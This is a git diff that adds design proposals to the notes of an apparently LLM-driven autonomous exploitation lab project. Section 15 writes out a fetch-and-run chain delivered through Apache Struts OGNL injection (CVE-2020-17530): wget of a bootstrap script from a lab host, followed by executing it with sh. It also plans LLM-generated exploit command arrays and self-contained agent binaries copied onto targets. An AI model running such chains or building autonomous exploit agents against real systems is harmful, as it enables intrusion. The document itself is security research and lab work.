@@ -705,3 +705,143 @@ The Manager should assess:
 5. How the external paper should be cited in future research and invention-positioning documents.
 ```
 Fábio Schorn
+
+---
+
+## 15. N-step protocol-aware bootstrap array — removing the hardcoded delivery limit
+
+> **Status (2026-06-11):** Brainstorm / design proposal. Current implementation uses a hardcoded 2-request sentinel (`__struts_bypass__`) for the Apache Struts OGNL family. This section proposes making the delivery chain a fully dynamic, LLM-generated array valid for all protocols.
+
+### Current limitation
+
+The `__struts_bypass__` sentinel in `BootstrapAction::HttpPost` expands to exactly two sequential HTTP POST requests in the executor:
+
+```text
+Request A → OGNL that executes: wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh
+Request B → OGNL that executes: sh /tmp/bootstrap.sh
+```
+
+This works for CVE-2020-17530 (Apache Struts) because `freemarker.template.utility.Execute.exec(ArrayList)` concatenates all list elements into a single string and passes it to `Runtime.exec(String)`, which tokenizes by whitespace without shell interpretation. The hardcoded split solves a known constraint but is not generalizable.
+
+### Proposed direction: `OgnlExec` action with `commands: Vec<String>`
+
+Replace the sentinel with a proper `BootstrapAction` variant:
+
+```json
+{
+  "action": {
+    "OgnlExec": {
+      "port": 8080,
+      "path": "/?id=",
+      "commands": [
+        "wget -q http://172.21.0.2:8001/bootstrap.sh -O /tmp/bootstrap.sh",
+        "sh /tmp/bootstrap.sh",
+        "any additional command the LLM determines is necessary"
+      ]
+    }
+  }
+}
+```
+
+The executor iterates `commands`, wraps each element in the Struts SecurityMemberAccess bypass OGNL, and fires one HTTP POST per element. N commands = N requests. The LLM decides the array.
+
+### Why this matters beyond Struts
+
+The underlying constraint — one command per request due to `Runtime.exec(String)` tokenization — applies to any CVE class that uses a Java RCE mechanism without a shell interpreter layer. Other exploit families (Java deserialization gadget chains, Spring EL injection, certain SSRF-to-RCE paths) may have the same or similar constraints. A generic array model accommodates all of them.
+
+The same principle extends to non-HTTP protocols: `FtpModCopy` already uses a typed step array for FTP. A future `JndiExec` (Log4Shell), `SpelExec` (Spring EL), or `XmlRpcExec` adapter would follow the same pattern — a named action with a `commands` array that the LLM populates based on Exploit-DB technique metadata.
+
+### Connection to Issue #144
+
+The north star for Issue #144 is that the LLM receives Exploit-DB/SearchSploit metadata describing the CVE's technique (platform, exploit_type, technique_hint), reasons from that metadata, and autonomously generates the `commands` array. Nobody pre-defines the step count. The lab validates that the LLM arrived at the correct N-step chain from external exploit intelligence — not from a recipe hardcoded in the executor.
+
+### What does not change
+
+```text
+- physarum-scanner sensing: unchanged
+- LLM Turn 1 template selection: unchanged
+- physarum-sporangium template execution: unchanged
+- VulnerabilityIntelService / vulnerability_candidates: unchanged
+- PolicyGate: unchanged and mandatory
+- lineage: unchanged
+- All existing constraints: unchanged
+```
+
+The `OgnlExec` change is additive and local to the executor. The pipeline above and below the bootstrap step is untouched.
+
+---
+
+## 16. Exploit-DB CSV embedded in the physarum-maze binary
+
+> **Status (2026-06-11):** Brainstorm / design proposal. Motivating context: the AWS lab has no Docker volume mounts — the binary arrives on the target via SCP and must be 100% self-contained.
+
+### Problem
+
+The current `advisory-cache` volume mount in the Docker Compose file makes exploit-reference data available in the Docker lab. In the AWS lab, there is no orchestrator and no volume mount. The binary must carry its own data.
+
+### Proposed approach: `include_bytes!` + `zstd` + in-memory parse
+
+```text
+build.rs
+  -> filter files_exploits.csv to rce-relevant subset
+       (type=remote/webapps, verified=1, CVSS >= 7.0)
+     -> compress with zstd -19
+     -> output: data/files_exploits_rce.csv.zst
+
+physarum-maze binary
+  -> include_bytes!("../data/files_exploits_rce.csv.zst")  [compile time]
+  -> on startup: zstd::decode_all() -> parse_csv_into_map()
+  -> HashMap<cve_id, Vec<ExploitReference>> in memory
+  -> no disk writes, no /tmp dependency
+```
+
+The `ExploitDbService` in `physarum-maze` returns structured `ExploitReference` metadata to the LLM — not raw exploit payloads. Fields such as `platform`, `exploit_type`, `technique_hint`, `requires_auth`, and `expected_effect` give the LLM the reasoning material it needs to propose a correct delivery strategy.
+
+### Size estimate
+
+The full `files_exploits.csv` is approximately 100 MB. The filtered RCE-relevant subset contains approximately 8,000–12,000 entries. With `zstd -19` on CSV (highly repetitive text), the expected compressed size is **2–4 MB**. The binary grows by that amount — acceptable for SCP delivery.
+
+### Why in-memory and not /tmp
+
+Exploit-DB data becomes a `HashMap` at startup. There is no file to manage, no cleanup required, no permission dependency on `/tmp`. The data lives for the process lifetime and is discarded on exit.
+
+### Operational result
+
+The binary is identical in Docker and AWS. No environment variable, volume mount, or configuration change is required between the two. `ExploitDbService` queries the same in-memory map in both environments.
+
+---
+
+## 17. Nuclei templates embedded in the physarum-maze binary as a compressed archive
+
+> **Status (2026-06-11):** Brainstorm / design proposal. Companion to section 16 — same motivation (AWS self-contained binary), different handling because templates are a directory tree read at runtime by physarum-sporangium.
+
+### Problem
+
+`physarum-sporangium` reads Nuclei-compatible YAML templates from a directory path configured via `PHYSARUM_TEMPLATE_DIR`. In the Docker lab this path is satisfied by a volume mount. In the AWS lab there is no volume mount — the directory must exist on the target host after the binary arrives.
+
+### Proposed approach: `tar.zst` embedded + extraction to `/tmp` on startup
+
+```text
+build.rs
+  -> tar -C examples/nuclei-legacy -cf - . | zstd -19 -o data/templates.tar.zst
+  -> cargo:rerun-if-changed=examples/nuclei-legacy
+
+physarum-maze binary
+  -> include_bytes!("../data/templates.tar.zst")  [compile time]
+  -> on startup: zstd::decode_all() -> unpack_tar() -> /tmp/physarum/templates/
+       (extraction skipped if path already exists)
+  -> PHYSARUM_TEMPLATE_DIR resolved to /tmp/physarum/templates/
+  -> physarum-sporangium reads YAML from disk as normal — no change to template engine
+```
+
+### Why /tmp here and not in-memory (unlike section 16)
+
+`physarum-sporangium` iterates directories and reads template files by path on demand. Refactoring it to use an in-memory virtual filesystem would require significant changes to the template engine with no proportional benefit. Extracting once to `/tmp` at startup is simpler and `/tmp` is guaranteed writable on any Linux target, including EC2.
+
+### Size estimate
+
+The `nuclei-legacy` template directory contains YAML files that are highly repetitive and compress well. Expected compressed archive size: **300–700 KB**. Combined with the Exploit-DB payload from section 16, the total binary growth is approximately **3–5 MB** — acceptable for SCP delivery in any network-accessible lab environment.
+
+### Operational result
+
+The binary carries both the Exploit-DB index (in-memory, section 16) and the template library (extracted to `/tmp`, this section). After SCP delivery, the agent initializes, extracts templates, loads exploit references, and begins the full sensing → LLM → PolicyGate → lineage pipeline — identically in Docker and AWS, with zero external dependencies.
